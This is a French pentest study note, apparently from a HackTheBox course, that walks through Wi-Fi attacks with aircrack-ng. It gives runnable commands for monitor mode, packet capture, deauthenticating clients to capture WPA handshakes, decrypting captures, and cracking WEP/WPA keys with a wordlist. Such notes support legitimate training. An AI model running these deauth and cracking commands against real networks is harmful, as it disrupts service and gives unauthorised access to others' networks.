

|**Tool**|**Description**|
|---|---|
|`Airmon-ng`|Airmon-ng can enable and disable monitor mode on wireless interfaces.|
|`Airodump-ng`|Airodump-ng can capture raw 802.11 frames.|
|`Airgraph-ng`|Airgraph-ng can be used to create graphs of wireless networks using the CSV files generated by Airodump-ng.|
|`Aireplay-ng`|Aireplay-ng can generate wireless traffic.|
|`Airdecap-ng`|Airdecap-ng can decrypt WEP, WPA PSK, or WPA2 PSK capture files.|
|`Aircrack-ng`|Aircrack-ng can crack WEP and WPA/WPA2 networks that use pre-shared keys or PMKID.|


[[#1. Passer en mode monitor]]
[[#2. Capturer les paquets]]
[[#3. Illustrer les interactions entre clients et AP]]
[[#4. Tester l'injection de paquet]]
[[#5. Désauthentifier les clients]]
[[#6. Déchiffrer le fichier de capture]]
[[#7. Cracker la clé]]


# 1. Passer en mode monitor


```shell-session
sudo airmon-ng start wlan0
```

Possible de préciser un channel.

```shell-session
sudo airmon-ng start wlan0 1
```

```shell-session
iwconfig
```

Stopper le mode monitor

```shell-session
sudo airmon-ng stop wlan0mon
```

```
sudo ifconfig wlan0 up
```

```shell-session
iwconfig
```

En cas d'interférences

> [!Warning]
> A faire uniquement en cas de difficultés

```shell-session
sudo airmon-ng check
```

```shell-session
sudo airmon-ng check kill
```




# 2. Capturer les paquets


Une fois le monitor mode activé, possible de capturer les paquets avec airodump

```shell-session
sudo airodump-ng wlan0mon --manufacturer
```

Possible de restreindre la capture à un channel

```shell-session
sudo airodump-ng -c 11 wlan0mon --manufacturer
```

ou plusieurs channels

```shell-session
sudo airodump-ng -c 11,1,6 wlan0mon --manufacturer
```


Scanner sur une fréquence spécifique (par défaut sur 2.4Ghz)

band a -> 5 Ghz
band b -> 2.4 Ghz
band g -> 2.4 Ghz

```shell-session
sudo airodump-ng wlan0mon --band a --manufacturer
```

Possible de combiner les fréquences

```
sudo airodump-ng wlan0mon --band abg --manufacturer
```

Sauvegarder l'output

```
sudo airodump-ng wlan0mon --band abg -w file --manufacturer
```



# 3. Illustrer les interactions entre clients et AP

### Clients connectés aux AP (CAPR)

Possible de passer le .csv au format png pour avoir une représentation graphique des clients connectés aux AP.

```
sudo airgraph-ng -i HTB-01.csv -g CAPR -o HTB_CAPR.png
```


### Clients qui tentent de se connecter aux AP (Common Probe)

Possible de passer le .csv au format png pour avoir une représentation graphique des clients qui tentent de se connecter aux AP.

```
sudo airgraph-ng -i HTB-01.csv -g CPG -o HTB_CPG.png
```



# 4. Tester l'injection de paquet

Stopper mode monitor

```
sudo airmon-ng stop wlan0mon
```

lancer en mode monitor sur le channel du BSSID

```
sudo airmon-ng start wlan0 1
```

tester l'injection de paquet.

```shell-session
sudo aireplay-ng --test wlan0mon
```


# 5. Désauthentifier les clients

> [!TIP]
> A faire en parallèle de la capture
> Permet de capturer le 4 way handshake lors de la reauth

Lancer la capture sur le bssid et channel cible avec fichier de sortie

```shell-session
sudo airodump-ng wlan0mon -w handshake -c 1 --bssid <BSSID>
```

déconnecter un client (10 deauth) EN PARALLELE

```shell-session
sudo aireplay-ng --deauth 10 -a <BSSID_AP> -c <MAC_client> wlan0mon
```

ou déconnecter tous les clients (10 deauth) EN PARALLELE

```shell-session
sudo aireplay-ng --deauth 10 -a <BSSID_AP> wlan0mon
```

Constater la reconnexion des clients (Voir l'augmentation des Lost packets et nombre de Frames) et capturer le 4way handshake au format cap. (WPA/WPA2)


Possible de capturer uniquement les IVs dans le cas d'une clé WEP

```shell-session
sudo airodump-ng wlan0mon --ivs -w capture.ivs
```


# 6. Déchiffrer le fichier de capture

> [!important]
> Dechiffre le fichier dans un fichier file-dec.cap

Enlever le header du fichier .pcap (pour les captures non chiffrées)

```usage
sudo airdecap-ng -b <bssid> <capture-file>
```

Possible de déchiffrer une capture WEP avec la clé

```shell-session
sudo airdecap-ng -w "<clé_WEP>" <capture-file>
```

Possible de déchiffrer une capture WPA/WPA2 avec la clé

```usage
sudo airdecap-ng -p <passphrase> <capture-file> -e <essid>
```


# 7. Cracker la clé

[[3. Password Cracking Techniques]]

Benchmark CPU.

```
aircrack-ng -S
```

### WEP

```shell-session
aircrack-ng -K capture.ivs
```


### WPA / WPA2

Fonctionne uniquement avec wordlist

```shell-session
aircrack-ng handshake.cap -w /usr/share/wordlists/rockyou.txt
```













